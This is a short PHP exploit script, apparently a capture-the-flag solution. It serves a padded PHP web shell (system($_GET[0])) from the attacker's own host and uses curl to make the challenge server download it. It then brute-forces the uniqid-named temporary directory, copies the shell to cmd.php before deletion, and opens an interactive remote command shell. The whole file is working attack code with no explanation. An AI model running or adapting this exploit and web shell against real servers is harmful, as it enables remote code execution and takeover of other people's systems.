<?php

// start server before with : php -S 0.0.0.0:8888

$chall_url = "http://127.0.0.1:40001";
$attacker_url = "http://172.17.0.1:8888";
$seed_length = 11;

if (php_sapi_name() !== 'cli') {
    for ($i = 0; $i < 30; $i++) {
        if (file_get_contents('.status') === 'found')
            die('<?php system($_GET[0]); // CHUNKY ' . str_repeat("PWNED",2000000)); // ~10 MB file
        sleep(1);
    }
}

file_put_contents('.status', 'ko');
$start = hexdec(substr(uniqid(), 0, $seed_length));
system("curl -s '$chall_url/module/sha1img' --data-urlencode 'url=$attacker_url/pwn.php' > .curl_bg_task &");

echo "Searching for temporary directory...\n";
for ($nb_req = 0; $nb_req < 10000000; $nb_req++) {
    $uniq = dechex($start + $nb_req);
    $base_url = "$chall_url/tmp/downloads/random-$uniq/";
    @file_get_contents($base_url);

    if (strstr($http_response_header[0], '403')) {
        echo "  [Dir] '/tmp/downloads/random-$uniq/' \t(in $nb_req requests)\n";
        file_put_contents('.status', 'found');
        while ($nb_req++) {
            $result = @file_get_contents("$base_url/pwn.php?0=".urlencode("cp pwn.php cmd.php"));
            if (!strstr($http_response_header[0], '404')) {
                while (1) {
                    $cmd = readline('(semi-interactive shell) $> ');
                    readline_add_history($cmd);
                    echo file_get_contents("$base_url/cmd.php?0=".urlencode($cmd)) . "\n";
                }
            }
        }

    }    
}